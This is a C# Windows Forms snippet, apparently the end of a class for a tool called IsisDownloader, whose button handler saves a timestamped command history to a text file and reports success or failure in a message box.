        private void BtnSaveTxt_Click(object sender, EventArgs e)
        {
            if (codeHistory.Count == 0) return;

            string basePath = AppDomain.CurrentDomain.BaseDirectory;
            string fullPath = Path.Combine(basePath, "IsisDownloader_Codes.txt");

            try
            {
                var sb = new StringBuilder();
                foreach (var item in codeHistory)
                {
                    sb.AppendLine($"[{item.Timestamp}] {item.Command}");
                }
                File.WriteAllText(fullPath, sb.ToString(), Encoding.UTF8);
                MessageBox.Show(this, "IsisDownloader_Codes.txt has been saved at:\n\n" + fullPath, "Saved", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Failed to write IsisDownloader_Codes.txt: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
